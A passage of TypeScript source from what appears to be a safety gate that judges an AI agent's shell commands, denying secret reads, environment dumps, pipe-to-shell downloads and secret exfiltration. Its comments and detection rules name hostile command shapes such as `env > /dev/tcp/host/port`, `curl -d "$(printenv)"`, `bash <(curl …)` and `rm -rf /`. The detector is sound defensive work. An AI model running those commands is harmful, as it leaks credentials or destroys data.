      if (hasSpec(head) || isKnownHead(head)) return [];
      return [...valuesOf(parsed, ...COMMON_OUTPUT_FLAGS), ...singleDashOutputs(args)];
  }
}

// --- signals ---------------------------------------------------------------

function isNetworkClient(head: string): boolean {
  return HTTP_CLIENTS.has(head) || REMOTE_CLIENTS.has(head);
}

/** Whether a command can carry what it is given off this machine. */
function sendsOut(view: CommandView): boolean {
  const { head } = view.command;
  if (isNetworkClient(head) || SENDERS.has(head) || FETCHERS.has(head)) return true;
  return head === 'rsync' && view.args.some(arg => REMOTE_PATH.test(arg.text));
}

/** Raises the signal for a call that reaches out over the network with a method or a body. */
function judgeNetworkClient(view: CommandView, judgement: Judgement): void {
  const { command, args } = view;
  const { head } = command;
  const remoteRsync = head === 'rsync' && args.some(arg => REMOTE_PATH.test(arg.text));
  if (REMOTE_CLIENTS.has(head) || remoteRsync) {
    signal(judgement, 'risk.network_request', 'unlikely');
    return;
  }
  const parsed = parseOptions(args, specFor(head));
  const unsafeMethod = (...flags: string[]): boolean =>
    valuesOf(parsed, ...flags).some(method => !SAFE_HTTP_METHODS.has(method.text.toUpperCase()));

  let risky = false;
  if (head === 'gh') {
    if (parsed.positionals[0]?.text !== 'api') return;
    risky = unsafeMethod('-X', '--method') || hasOption(parsed, ...GH_API_BODY_FLAGS);
  } else if (head === 'curl') {
    risky = unsafeMethod('-X', '--request') || hasOption(parsed, ...CURL_BODY_FLAGS);
  } else if (head === 'wget') {
    risky = hasOption(parsed, ...WGET_BODY_FLAGS);
  } else if (HTTP_CLIENTS.has(head)) {
    // httpie-style: an explicit method, or request items after the URL.
    risky = parsed.positionals.some(
      (arg, index) =>
        (index === 0 && /^(POST|PUT|PATCH|DELETE)$/i.test(arg.text)) ||
        (!arg.text.includes('://') && /[=@]/.test(arg.text))
    );
  }
  if (risky) signal(judgement, 'risk.network_request', 'unlikely');
}

/** Raises the mutation signal for the verbs that change state outside what git can undo. */
function judgeMutation(view: CommandView, judgement: Judgement): void {
  const { command, args } = view;
  const { head } = command;
  const parsed = parseOptions(args, specFor(head));
  const { positionals } = parsed;
  const privileged = (name: string): boolean => WRAPPERS[name]?.kind === 'privileged';
  if (command.wrappers.some(privileged) || privileged(head)) {
    signal(judgement, 'risk.mutation_verb', 'unlikely');
  }
  const hint = MUTATION_HEADS[head];
  if (hint !== undefined && !judgement.settled.has(command)) {
    signal(judgement, 'risk.mutation_verb', hint);
  }
  if (HOST_CLIENTS.has(head)) {
    // A database client always connects somewhere: one that names nothing says `unknown`.
    const database = DATABASE_CLIENTS.has(head);
    const host =
      targetHost(
        args.filter(arg => !arg.dynamic).map(arg => arg.text),
        database
      ) ?? (database ? 'unknown' : undefined);
    if (host !== undefined) noteFact(judgement.facts, 'targetHost', host);
  }
  if (head.startsWith('mkfs')) signal(judgement, 'risk.mutation_verb', 'unlikely');

  const recursive = hasOption(parsed, '-R') || hasAbbreviated(parsed, '--recursive', '--rec');
  if (['chmod', 'chown', 'chgrp'].includes(head) && recursive) {
    signal(judgement, 'risk.mutation_verb');
  }
  if (PUBLISHERS.has(head) && positionals[0]?.text === 'publish') {
    signal(judgement, 'risk.mutation_verb', 'unlikely');
  }
  if (head === 'rsync' && [...parsed.flags].some(flag => /^--(delete|remove-source)/.test(flag))) {
    signal(judgement, 'risk.mutation_verb');
  }
  if (head === 'gh') {
    const [group, verb] = positionals.map(arg => arg.text);
    if (group !== undefined && GH_GROUPS.has(group) && verb !== undefined) {
      if (!GH_READ_VERBS.has(verb)) {
        signal(judgement, 'risk.mutation_verb', 'unlikely');
        noteFact(judgement.facts, 'githubAction', githubAction(group, verb));
      }
    }
  }
}

/** Whether a command prints a live credential by itself (`gh auth token`). */
function printsToken(view: CommandView): boolean {
  const parsed = parseOptions(view.args, specFor(view.command.head));
  const words = parsed.positionals.map(arg => arg.text);
  return TOKEN_PRINTERS.some(
    printer =>
      printer.head === view.command.head &&
      printer.words.every((word, index) => words[index] === word) &&
      (printer.flag === undefined || hasOption(parsed, ...printer.flag))
  );
}

/** Whether a command prints the whole environment, where credentials live. */
function dumpsEnvironment(view: CommandView): boolean {
  const { command, args } = view;
  const parsed = parseOptions(args);
  const bare = parsed.positionals.length === 0;
  switch (command.head) {
    case 'printenv':
    case 'env':
      return bare;
    case 'set':
      return args.length === 0;
    case 'export':
    case 'declare':
    case 'typeset':
      return bare && (args.length === 0 || hasOption(parsed, '-p', '-x'));
    case 'compgen':
      return hasOption(parsed, '-e', '-v');
    default:
      return false;
  }
}

// --- reads -----------------------------------------------------------------

/** How much program text is read, and how many of its strings are judged. */
const MAX_CODE_CHARS = 32_768;
const MAX_CODE_STRINGS = 64;

interface CodeString {
  text: string;
  quote: string;
  start: number;
  end: number;
}

/**
 * The quoted strings of a program, in one pass. An unterminated quote ends the
 * scan: nothing after it can be told from the inside of that string.
 */
function scanCodeStrings(code: string): { strings: CodeString[]; complete: boolean } {
  const strings: CodeString[] = [];
  let i = 0;
  while (i < code.length) {
    const quote = code[i] ?? '';
    if (quote !== "'" && quote !== '"' && quote !== '`') {
      i++;
      continue;
    }
    let text = '';
    let j = i + 1;
    while (j < code.length && code[j] !== quote) {
      const escaped = code[j] === '\\' && j + 1 < code.length;
      text += code[escaped ? j + 1 : j] ?? '';
      j += escaped ? 2 : 1;
    }
    if (j >= code.length) return { strings, complete: false };
    strings.push({ text, quote, start: i, end: j + 1 });
    if (strings.length > MAX_CODE_STRINGS) return { strings, complete: false };
    i = j + 1;
  }
  return { strings, complete: true };
}

/** Calls that hand their argument to a shell or run it as a command. */
const EXEC_CALL =
  /(?:\b(?:system|popen|Popen|run|call|check_call|check_output|getoutput|getstatusoutput|exec|execSync|execFile|execFileSync|spawn|spawnSync|shell_exec|passthru|proc_open|sh|shell|cmd|subprocess|child_process)|[$`])\s*\(?\s*(\[\s*)?$/;
/** Calls that open the file their argument names. */
const READ_CALL =
  /\b(?:open|fopen|readFileSync|readFile|createReadStream|read_text|read_bytes|read|file_get_contents|load_dotenv|dotenv_values|config|Path|slurp)\s*\(\s*$/;
/** Interpreters in which a backtick string is itself a command. */
const BACKTICK_RUNS: ReadonlySet<string> = new Set(['ruby', 'perl', 'php']);
/** How far back from a string its callee is looked for. */
const CALL_LOOKBEHIND = 48;

/**
 * Looks inside interpreter code for what the gate can recognise there.
 *
 * A string handed to a call that runs commands (`os.system('…')`,
 * `execSync('…')`, `subprocess.run(["git", "reset", "…"])`) is judged as that
 * command, and a secret path handed to a call that opens files is a secret
 * read. Any other string is only text as far as this reader can tell — a test
 * name, a message, a JSON value — so a destructive command or a secret path
 * found there raises a signal and never a denial. Everything else in the
 * program is invisible.
 */
async function judgeCode(
  source: string,
  head: string,
  scope: ShellScope,
  mode: Mode
): Promise<void> {
  if (mode.nesting >= MAX_SCRIPT_NESTING) return;
  const { judgement, context } = scope;
  const inner: Mode = { nesting: mode.nesting + 1, speculative: true };
  const code = source.slice(0, MAX_CODE_CHARS);
  const { strings, complete } = scanCodeStrings(code);
  // What was not read may hold anything.
  if (!complete || source.length > MAX_CODE_CHARS) signal(judgement, 'risk.opaque_shell');

  for (const [index, string] of strings.entries()) {
    const before = code.slice(Math.max(0, string.start - CALL_LOOKBEHIND), string.start);
    const call = EXEC_CALL.exec(before);
    const runs = call !== null || (string.quote === '`' && BACKTICK_RUNS.has(head));
    if (runs) {
      // An argv list: the strings that follow, separated by nothing but commas.
      let script = string.text;
      if (call?.[1] !== undefined) {
        for (let next = index + 1; next < strings.length; next++) {
          const between = code.slice(strings[next - 1]?.end, strings[next]?.start);
          if (!/^\s*,\s*$/.test(between)) break;
          script += ` ${strings[next]?.text ?? ''}`;
        }
      }
      await judgeScript(parseShell(script), scope.cwd, context, judgement, inner);
      continue;
    }
    if (/\s/.test(string.text)) {
      // Text that reads like a command: judged on the side, and a denial there is only a signal here.
      const aside = newJudgement();
      await judgeScript(parseShell(string.text), scope.cwd, context, aside, inner);
      if (aside.deny !== undefined) signal(judgement, 'risk.opaque_shell');
      continue;
    }
    const pathLike = /[/.~]/.test(string.text) && !string.text.includes('://');
    if (pathLike && isSecretPath(literalView(string.text, context))) {
      if (READ_CALL.test(before)) deny(judgement, 'deny.secret_read');
      else signal(judgement, 'risk.secret_path_argument');
    }
  }
}

/** The program an interpreter was handed on its command line or stdin. */
function interpreterCode(view: CommandView): string[] {
  const { command, args } = view;
  if (!INTERPRETERS.has(command.head)) return [];
  const parsed = parseOptions(args, specFor(command.head));
  const flagged = valuesOf(parsed, ...CODE_FLAGS).map(value => value.text);
  // `deno eval '<code>'`, `bun -e` aside: the subcommand form.
  const [verb, code] = parsed.positionals;
  const evaluated = verb?.text === 'eval' && code !== undefined ? [code.text] : [];
  return [...flagged, ...evaluated, ...command.stdin];
}

/** curl: the files a request body names with `@path`, alone or inside `name=@path`. */
function curlUploads(parsed: Options): Arg[] {
  const always = valuesOf(parsed, '-T', '--upload-file');
  const marked = valuesOf(parsed, ...CURL_BODY_FLAGS)
    .filter(value => !always.includes(value))
    .flatMap(value => {
      const at = /(?:^|=|;)[@<]([^;,]+)/.exec(value.text)?.[1];
      return at === undefined ? [] : [{ ...value, text: at }];
    });
  return [...always, ...marked];
}

/** The arguments of a git command that name files, as opposed to revisions and patterns. */
async function gitFileArguments(git: GitCommandLine, scope: ShellScope): Promise<Arg[]> {
  const { subcommand, args } = git.primary;
  if (subcommand === undefined) return [];
  // Everything after `--` is a path, for every subcommand.
  const dashDash = args.findIndex(arg => !arg.dynamic && arg.text === '--');
  const after = dashDash === -1 ? [] : args.slice(dashDash + 1);
  const parsed = parseOptions(
    dashDash === -1 ? args : args.slice(0, dashDash),
    GIT_OPTION_SPECS[subcommand]
  );
  if (GIT_PATH_SUBCOMMANDS.has(subcommand)) {
    // `git grep <pattern> [paths]`: the pattern is not a path unless -e or -f gave it.
    const patterned = subcommand === 'grep' && valuesOf(parsed, '-e', '-f').length === 0;
    return [...(patterned ? parsed.positionals.slice(1) : parsed.positionals), ...after];
  }
  if (!GIT_REVISION_SUBCOMMANDS.has(subcommand)) return after;
  const named: Arg[] = [];
  for (const arg of parsed.positionals) {
    const colon = arg.text.lastIndexOf(':');
    if (colon !== -1) {
      named.push({ ...arg, text: arg.text.slice(colon + 1) });
    } else if (!arg.dynamic) {
      const where = await locate(arg.text, scope.cwd, scope.context);
      if (where.kind === 'resolved' && where.exists) named.push(arg);
    }
  }
  return [...named, ...after];
}

/** The arguments of a command that name files it opens. */
function fileArguments(view: CommandView): Arg[] {
  const { command, args } = view;
  const { head } = command;
  const spec = specFor(head);
  const parsed = parseOptions(args, spec);
  if (head === 'curl') return curlUploads(parsed);

  const patterned =
    PATTERN_FIRST.has(head) && valuesOf(parsed, '-e', '--regexp', '--expression').length === 0;
  const scriptFile = PATTERN_FIRST.has(head) && valuesOf(parsed, '-f', '--file').length > 0;
  const operands = patterned && !scriptFile ? parsed.positionals.slice(1) : parsed.positionals;

  // Option values: for a command with a table entry only those known to be
  // files it reads; for any other, every value that is not text or a credential in use.
  const values = [...parsed.values.entries()].flatMap(([name, list]) => {
    if (TEXT_VALUE_FLAGS.has(name) || CREDENTIAL_USE_FLAGS.has(name)) return [];
    if (hasSpec(head))
      return (FILE_VALUE_FLAGS[SPEC_ALIASES[head] ?? head] ?? []).includes(name) ? list : [];
    return COMMON_OUTPUT_FLAGS.includes(name) ? [] : list;
  });
  return [...operands, ...values];
}

/** For commands with an option table: the options whose value is a file the command reads. */
const FILE_VALUE_FLAGS: Readonly<Record<string, readonly string[]>> = {
  grep: ['-f', '--file', '--exclude-from'],
  rg: ['-f', '--file', '--ignore-file'],
  sed: ['-f', '--file'],
  awk: ['-f', '--file'],
  jq: ['-f', '--from-file'],
  wget: ['--post-file', '--body-file', '-i', '--input-file', '--load-cookies'],
  patch: ['-i', '--input'],
  node: ['--env-file', '-r', '--require', '--import'],
  docker: ['--env-file'],
  openssl: ['-in', '-inkey', '-key', '-kfile', '-passin'],
  gpg: ['--passphrase-file'],
  rsync: ['--files-from', '--password-file'],
  touch: ['-r', '--reference'],
  truncate: ['-r', '--reference'],
};

type ReadKind = 'metadata' | 'sends' | 'reads';

/** What a command does with a file it is given, as far as secrets are concerned. */
function readKind(view: CommandView, git: GitCommandLine | undefined): ReadKind {
  const { head } = view.command;
  if (git !== undefined) {
    // Only the subcommands that take files can read one; `gitFileArguments` picks the files.
    const { subcommand } = git.primary;
    const parsed = parseOptions(git.primary.args, GIT_OPTION_SPECS[subcommand ?? '']);
    const untracks = subcommand === 'rm' && hasOption(parsed, '--cached');
    return untracks ? 'metadata' : 'reads';
  }
  if (METADATA_ONLY.has(head) || NAME_BUILTINS.has(head)) return 'metadata';
  return sendsOut(view) ? 'sends' : 'reads';
}

/**
 * Judges the paths a command reads. A secret path given to any command is
 * denied unless the command only looks at metadata: a command this table does
 * not know may print, copy or load the file as easily as `cat` would.
 */
async function judgeReads(view: CommandView, scope: ShellScope, mode: Mode): Promise<void> {
  const { command } = view;
  const { head } = command;
  const { judgement, context } = scope;

  if (printsToken(view)) deny(judgement, 'deny.secret_read');
  if (dumpsEnvironment(view)) signal(judgement, 'risk.environment_dump');
  for (const code of interpreterCode(view)) {
    if (head === 'pwsh' || head === 'powershell') {
      // PowerShell code is command text. It is not POSIX shell, so it is read for
      // what it shares with it and never taken as understood.
      signal(judgement, 'risk.opaque_shell');
      if (mode.nesting < MAX_SCRIPT_NESTING) {
        const inner: Mode = { nesting: mode.nesting + 1, speculative: mode.speculative };
        await judgeScript(parseShell(code), scope.cwd, context, judgement, inner);
      }
    } else {
      await judgeCode(code, head, scope, mode);
    }
  }

  const git = head === 'git' ? parseGit(view.args) : undefined;
  const kind = readKind(view, git);
  const refuse = (): void => {
    if (kind === 'sends') deny(judgement, 'deny.secret_exfiltration');
    else if (mode.speculative && !isKnownHead(head)) signal(judgement, 'risk.secret_path_argument');
    else deny(judgement, 'deny.secret_read');
  };

  // Whatever reads stdin reads the redirected file, unless the command ignores stdin.
  if (!TEXT_ONLY.has(head) && !(METADATA_ONLY.has(head) || NAME_BUILTINS.has(head))) {
    for (const redirection of command.redirections) {
      if (redirection.operator !== '<') continue;
      const source = toArg(redirection.target, context);
      if (await isSecretArgument(source, scope)) refuse();
      else if (source.dynamic) signal(judgement, 'risk.opaque_shell');
    }
  }
  // Files the wrappers were handed are read by the wrapper, whatever it runs: `xargs -a <file>`.
  for (const word of command.wrapperWords) {
    const arg = toArg(word, context);
    if (!arg.text.startsWith('-') && (await isSecretArgument(arg, scope))) {
      deny(judgement, 'deny.secret_read');
    }
  }
  if (TEXT_ONLY.has(head) || kind === 'metadata') return;

  const isReader = CONTENT_READERS.has(head);
  const named = git === undefined ? fileArguments(view) : await gitFileArguments(git, scope);
  for (const arg of named) {
    // Prose is not a path: skip it unless a reader would try to open it.
    if (!isReader && /\s/.test(arg.text)) continue;
    if (await isSecretArgument(arg, scope)) {
      refuse();
      continue;
    }
    // A reader whose file is a variable, or a glob over hidden files, may be opening a
    // secret. Git is left out: its variable arguments are refs far more often than files.
    if (!isReader) continue;
    const name = arg.text.slice(arg.text.lastIndexOf('/') + 1);
    if (arg.dynamic || (arg.glob && name.startsWith('.'))) signal(judgement, 'risk.opaque_shell');
  }
}

// --- allow rule ------------------------------------------------------------

function isVerificationCommand(view: CommandView, context: RuleContext): boolean {
  if (view.args.some(arg => arg.dynamic)) return false;
  const argv = [view.command.head, ...view.args.map(arg => arg.text)];
  return context.verificationCommands.some(entry => {
    const prefix = entry.trim().split(/\s+/);
    return prefix.every((token, index) => argv[index] === token);
  });
}

/** Whether a command is a known read-only one. Git is decided by `judgeGit`. */
function isReadOnly(view: CommandView, scope: ShellScope, gitReadOnly: boolean): boolean {
  const { command, args } = view;
  if (command.head === '' || command.opaque.length > 0 || command.assignments.length > 0) {
    return false;
  }
  if (command.wrappers.some(wrapper => WRAPPERS[wrapper]?.kind !== 'benign')) return false;
  if (command.wrapperTargets.length > 0 || command.chdir !== undefined) return false;
  const writesFile = command.redirections.some(
    redirection => redirection.write && !isDeviceSink(toArg(redirection.target, scope.context))
  );
  if (writesFile) return false;
  if (isVerificationCommand(view, scope.context)) return true;
  if (command.head === 'git') return gitReadOnly;
  if (command.head === 'find') {
    return !args.some(arg => arg.text === '-delete' || FIND_FILE_ACTIONS.has(arg.text));
  }
  return READ_ONLY_HEADS.has(command.head);
}

// --- commands inside arguments ---------------------------------------------

const KNOWN_HEADS: ReadonlySet<string> = new Set([
  ...READ_ONLY_HEADS,
  ...CONTENT_READERS,
  ...METADATA_ONLY,
  ...TEXT_ONLY,
  ...NAME_BUILTINS,
  ...INTERPRETERS,
  ...SHELL_INTERPRETERS,
  ...FETCHERS,
  ...SENDERS,
  ...PUBLISHERS,
  ...COMMON_TOOLS,
  ...Object.keys(WRITERS),
  ...Object.keys(MUTATION_HEADS),
  ...Object.keys(OPTION_SPECS),
  ...Object.keys(SPEC_ALIASES),
  ...['rsync', 'tar', 'dd', 'sed', 'perl', 'xxd'],
]);

function isKnownHead(head: string): boolean {
  return KNOWN_HEADS.has(head) || head.startsWith('mkfs');
}

/**
 * Whether a command's arguments may themselves be a command: a tool this table
 * does not know, or one known to run what it is given.
 */
function runsItsArguments(view: CommandView): boolean {
  const { head } = view.command;
  if (head === '') return false;
  if (ARGUMENT_RUNNERS.has(head) || !isKnownHead(head)) return true;
  return PUBLISHERS.has(head) && view.args.some(arg => PACKAGE_EXEC.has(arg.text));
}

/**
 * Reads the arguments of a wrapper nobody listed as the commands they may be:
 * every suffix that starts at a command with rules of its own
 * (`flock x rm -rf /`), and every quoted argument holding more than one word
 * (`watch 'git reset --hard'`).
 */
function embeddedScripts(view: CommandView): ParsedShell[] {
  const cached = EMBEDDED.get(view);
  if (cached !== undefined) return cached;
  const scripts = findEmbeddedScripts(view);
  EMBEDDED.set(view, scripts);
  return scripts;
}

/** A command's embedded scripts are asked for by several rules: read them once. */
const EMBEDDED = new WeakMap<CommandView, ParsedShell[]>();

/** How many of each kind of embedded script one command is read for. */
const MAX_EMBEDDED_SCRIPTS = 6;

/**
 * Short options whose value is text in the tools that have them: a test name
 * filter, a title, a message. Their value is never read as a command. Options
 * that hand over a command (`-c`, `-x`, `--exec`, `--command`, `--run`) are
 * deliberately not here.
 */
const TEXT_SHORT_FLAGS: ReadonlySet<string> = new Set(['-g', '-t', '-e', '-m', '-k']);

function isTextFlag(text: string): boolean {
  const name = text.split('=')[0] ?? text;
  return TEXT_SHORT_FLAGS.has(name) || TEXT_VALUE_FLAGS.has(name);
}

function findEmbeddedScripts(view: CommandView): ParsedShell[] {
  if (!runsItsArguments(view)) return [];
  const scripts: ParsedShell[] = [];
  let suffixes = 0;
  let quoted = 0;
  let unread = false;
  view.args.forEach((arg, index) => {
    const previous = view.args[index - 1];
    // The value of a text option is a name or a message, whatever it says.
    if (previous !== undefined && !previous.dynamic && isTextFlag(previous.text)) return;
    if (!arg.dynamic && arg.text.startsWith('-') && isTextFlag(arg.text)) return;
    const name = arg.text.slice(arg.text.lastIndexOf('/') + 1);
    if (!arg.dynamic && EMBEDDED_HEADS.has(name)) {
      if (suffixes++ < MAX_EMBEDDED_SCRIPTS)
        scripts.push(parseArgv(view.command.args.slice(index)));
      else unread = true;
    }
    if (/\s/.test(arg.text.trim())) {
      if (quoted++ < MAX_EMBEDDED_SCRIPTS) scripts.push(parseShell(arg.text));
      else unread = true;
    }
  });
  // More candidates than the budget reads: say so rather than pass them unread.
  if (unread) {
    scripts.push({ commands: [], opaque: ['nesting_limit'], scopeParents: [], overBudget: false });
  }
  return scripts;
}

// --- one command -----------------------------------------------------------

async function changeDirectory(view: CommandView, scope: ShellScope): Promise<string | undefined> {
  const { context, judgement } = scope;
  const [target] = parseOptions(view.args).positionals;
  if (target === undefined) return context.homeDir;
  if (target.dynamic || target.glob || target.text === '-') {
    judgement.unplaced = true;
    return undefined;
  }
  const where = await locate(target.text, scope.cwd, context);
  if (where.kind !== 'resolved') {
    judgement.unplaced = true;
    return undefined;
  }
  if (!where.inside) signal(judgement, 'risk.cwd_outside_root');
  return where.real;
}

/**
 * Whether a command runs a file that a download wrote earlier in the same call:
 * `curl -o x.sh … && sh x.sh` is a download piped into a shell with a file in
 * between. Across separate tool calls the gate cannot see the link.
 */
async function runsFetchedFile(view: CommandView, scope: ShellScope): Promise<boolean> {
  const { command, args } = view;
  const { head } = command;
  const { judgement, context } = scope;
  if (judgement.fetched.size === 0) return false;
  let script: Arg | undefined;
  if (SHELL_INTERPRETERS.has(head)) {
    const invocation = shellInvocation(command.args);
    const [operand] = invocation.operands;
    script = invocation.dashC || operand === undefined ? undefined : toArg(operand, context);
  } else if (head === 'source' || head === '.') {
    [script] = args;
  } else if (INTERPRETERS.has(head)) {
    const parsed = parseOptions(args, specFor(head));
    script = hasOption(parsed, ...CODE_FLAGS) ? undefined : parsed.positionals[0];
  } else {
    // Run directly (`./x.sh`): only the file name of the command survives parsing.
    return [...judgement.fetched].some(path => path.slice(path.lastIndexOf('/') + 1) === head);
  }
  if (script === undefined || script.dynamic) return false;
  const where = await locate(script.text, scope.cwd, context);
  return where.kind === 'resolved' && judgement.fetched.has(rootView(where.real, context));
}

/** Judges one command. Returns whether it matched the read-only allow rule. */
async function judgeCommand(view: CommandView, outer: ShellScope, mode: Mode): Promise<boolean> {
  const { command, args } = view;
  const { judgement, context } = outer;

  // `env -C dir cmd` and `sudo -D dir cmd` run the command somewhere else.
  let scope = outer;
  if (command.chdir !== undefined) {
    const directory = toArg(command.chdir, context);
    const where = directory.dynamic ? undefined : await locate(directory.text, outer.cwd, context);
    scope = { ...outer, cwd: where?.kind === 'resolved' ? where.real : undefined };
    if (where?.kind !== 'resolved') judgement.unplaced = true;
    else if (!where.inside) signal(judgement, 'risk.cwd_outside_root');
  }

  if (command.opaque.length > 0) signal(judgement, 'risk.opaque_shell');
  if (command.assignments.some(name => EXEC_VARIABLES.has(name))) {
    signal(judgement, 'risk.opaque_shell');
  }
  const exported = NAME_BUILTINS.has(command.head)
    ? args.map(arg => /^([A-Za-z_][A-Za-z0-9_]*)=/.exec(arg.text)?.[1] ?? '')
    : [];
  if (exported.some(name => EXEC_VARIABLES.has(name))) signal(judgement, 'risk.opaque_shell');

  let gitReadOnly = false;
  if (command.head === 'git') gitReadOnly = await judgeGit(view, scope);
  if (command.head === 'rm' || command.head === 'rimraf') await judgeRm(view, scope);
  if (command.head === 'find') await judgeFind(view, scope);
  if (command.head === 'rg' && hasOption(parseOptions(args, specFor('rg')), ...RG_EXEC_FLAGS)) {
    signal(judgement, 'risk.opaque_shell');
  }

  const targets = [
    ...writeTargets(view, judgement),
    ...command.wrapperTargets.map(word => toArg(word, context)),
    ...command.redirections
      .filter(redirection => redirection.write)
      .map(redirection => toArg(redirection.target, context)),
  ];
  const alreadyWritten = new Set(judgement.targets);
  for (const target of targets) await judgeWriteTarget(target, scope);
  if (FETCHERS.has(command.head)) {
    for (const written of judgement.targets) {
      if (!alreadyWritten.has(written)) judgement.fetched.add(written);
    }
  }
  if (await runsFetchedFile(view, scope)) deny(judgement, 'deny.pipe_to_shell');

  await judgeReads(view, scope, mode);
  judgeMutation(view, judgement);
  judgeNetworkClient(view, judgement);

  if (mode.nesting < MAX_SCRIPT_NESTING) {
    const inner: Mode = { nesting: mode.nesting + 1, speculative: true };
    for (const script of embeddedScripts(view)) {
      await judgeScript(script, scope.cwd, context, judgement, inner);
    }
  }

  return isReadOnly(view, scope, gitReadOnly);
}

// ---------------------------------------------------------------------------
// Rules that span commands
// ---------------------------------------------------------------------------

/** Whether a command runs what arrives on its stdin as a program. */
function readsProgramFromStdin(view: CommandView): boolean {
  const { command, args } = view;
  const { head } = command;
  if (SHELL_INTERPRETERS.has(head)) {
    const invocation = shellInvocation(command.args);
    // `xargs sh -c` with no script word: the script is whatever the pipe carries.
    if (invocation.dashC) return invocation.script === undefined;
    const options = args.slice(0, args.length - invocation.operands.length);
    const first = invocation.operands[0];
    const operand = first === undefined ? undefined : resolveWord(first, '~').text;
    return (
      operand === undefined ||
      STDIN_PATHS.has(operand) ||
      options.some(option => /^-[A-Za-z]*s[A-Za-z]*$/.test(option.text))
    );
  }
  if (head === 'source' || head === '.') return args.some(arg => STDIN_PATHS.has(arg.text));
  // `at` and `batch` queue whatever shell text they are fed, unless given a file.
  if (head === 'at' || head === 'batch') return !args.some(arg => arg.text === '-f');
  if (INTERPRETERS.has(head)) {
    const parsed = parseOptions(args, specFor(head));
    if (hasOption(parsed, ...CODE_FLAGS)) return false;
    // `python3`, `python3 -`, `deno run -`, `bun run -`.
    const leading = parsed.positionals.slice(0, 2);
    return leading.length === 0 || leading.some(arg => STDIN_PATHS.has(arg.text));
  }
  return false;
}

/** What a command contributes to a pipeline, the commands found in its arguments included. */
interface Roles {
  fetches: boolean;
  dumps: boolean;
  runsStdin: boolean;
  leaves: boolean;
}

function rolesOf(view: CommandView, context: RuleContext): Roles {
  const embedded = embeddedScripts(view).flatMap(script =>
    script.commands.filter(command => command.parent === undefined).map(c => toView(c, context))
  );
  const all = [view, ...embedded];
  const readsEnviron = (candidate: CommandView): boolean =>
    [
      ...candidate.args,
      ...candidate.command.redirections
        .filter(redirection => redirection.operator === '<')
        .map(redirection => toArg(redirection.target, context)),
    ].some(arg => /^\/proc\/[^/]+\/environ$/.test(arg.text));
  return {
    fetches: all.some(candidate => FETCHERS.has(candidate.command.head)),
    dumps: all.some(candidate => dumpsEnvironment(candidate) || readsEnviron(candidate)),
    runsStdin: all.some(readsProgramFromStdin),
    leaves: all.some(
      candidate =>
        sendsOut(candidate) ||
        INTERPRETERS.has(candidate.command.head) ||
        SHELL_INTERPRETERS.has(candidate.command.head)
    ),
  };
}

/** Whether `earlier` writes into a pipe that `later` reads, at any level of grouping. */
function feeds(earlier: readonly PipelineStage[], later: readonly PipelineStage[]): boolean {
  for (let level = earlier.length - 1; level >= 0; level--) {
    const mine = earlier[level];
    const theirs = later.find(stage => stage.id === mine?.id);
    if (mine !== undefined && theirs !== undefined) return mine.stage < theirs.stage;
  }
  return false;
}

function judgeAcrossCommands(
  views: readonly CommandView[],
  context: RuleContext,
  judgement: Judgement
): void {
  const roles = views.map(view => rolesOf(view, context));
  // Members of each pipeline, so a command is compared with its own pipelines only.
  const members = new Map<number, number[]>();
  views.forEach((view, index) => {
    for (const stage of view.command.pipelinePath) {
      members.set(stage.id, [...(members.get(stage.id) ?? []), index]);
    }
  });
  views.forEach((later, index) => {
    const mine = roles[index];
    if (mine === undefined) return;
    const sharing = new Set(
      later.command.pipelinePath.flatMap(stage => members.get(stage.id) ?? [])
    );
    const upstream = [...sharing]
      .filter(at => {
        const earlier = views[at];
        return (
          at < index &&
          earlier !== undefined &&
          feeds(earlier.command.pipelinePath, later.command.pipelinePath)
        );
      })
      .map(at => roles[at]);

    if (mine.runsStdin && upstream.some(role => role?.fetches)) {
      deny(judgement, 'deny.pipe_to_shell');
    }
    if (mine.leaves && upstream.some(role => role?.dumps)) {
      deny(judgement, 'deny.secret_exfiltration');
    }
    // A dump sent straight to a host: `env > /dev/tcp/host/port`.
    const toNetwork = later.command.redirections.some(
      redirection =>
        redirection.write && NETWORK_DEVICE.test(toArg(redirection.target, context).text)
    );
    if (mine.dumps && toNetwork) deny(judgement, 'deny.secret_exfiltration');

    // The same attacks written as a substitution: `bash <(curl …)`,
    // `curl -d "$(printenv)"`, `curl … > >(sh)`, `curl … | tee >(sh)`.
    const { via } = later.command;
    const parent = later.command.parent ?? -1;
    const holder = views[parent];
    const holderRoles = roles[parent];
    if (holder === undefined || holderRoles === undefined) return;
    if (via === 'substitution') {
      if (mine.fetches && RUNS_ITS_ARGUMENT.has(holder.command.head)) {
        deny(judgement, 'deny.pipe_to_shell');
      }
      if (mine.dumps && holderRoles.leaves) deny(judgement, 'deny.secret_exfiltration');
    }
    if (via === 'sink') {
      const feedsHolder = views
        .map((earlier, at) => ({ earlier, at }))
        .filter(
          ({ earlier, at }) =>
            at < parent && feeds(earlier.command.pipelinePath, holder.command.pipelinePath)
        )
        .map(({ at }) => roles[at]);
      const sources = [holderRoles, ...feedsHolder];
      if (mine.runsStdin && sources.some(role => role?.fetches)) {
        deny(judgement, 'deny.pipe_to_shell');
      }
      if (mine.leaves && sources.some(role => role?.dumps)) {
        deny(judgement, 'deny.secret_exfiltration');
      }
    }
  });
}

/** The literal text a command writes to its stdout, when that can be read off the command. */
function printedText(view: CommandView): string | undefined {
  const { command, args } = view;
  if (args.some(arg => arg.dynamic)) return undefined;
  if (command.head === 'echo') return args.map(arg => arg.text).join(' ');
  // printf's first argument is the format; alone, it is all that is printed.
  if (command.head === 'printf')
    return args
      .slice(args.length > 1 ? 1 : 0)
      .map(a => a.text)
      .join(' ');
  // `cat <<EOF | sh`: the heredoc is what cat prints.
  if (command.head === 'cat' && args.length === 0 && command.stdin.length > 0) {
    return command.stdin.join('\n');
  }
  return undefined;
}

/** Judges one script. Returns whether every command in it matched the read-only allow rule. */
async function judgeScript(
  parsed: ParsedShell,
  startCwd: string | undefined,
  context: RuleContext,
  judgement: Judgement,
  mode: Mode = { nesting: 0, speculative: false }
): Promise<boolean> {
  // Past the reading budget nothing more is read, so nothing is judged: a long
  // tail must not be able to carry a command past the rules unseen.
  if (parsed.overBudget) {
    deny(judgement, 'deny.command_too_large');
    return false;
  }
  if (parsed.opaque.length > 0) signal(judgement, 'risk.opaque_shell');

  const views: CommandView[] = parsed.commands.map(command => toView(command, context));
  judgeAcrossCommands(views, context, judgement);

  // One working directory per subshell: a `cd` inside `( ... )` or `$(...)` ends
  // with it. A subshell starts where its enclosing one stands when it is first used.
  const cwdByScope = new Map<number, string | undefined>();
  const cwdOf = (id: number): string | undefined => {
    if (cwdByScope.has(id)) return cwdByScope.get(id);
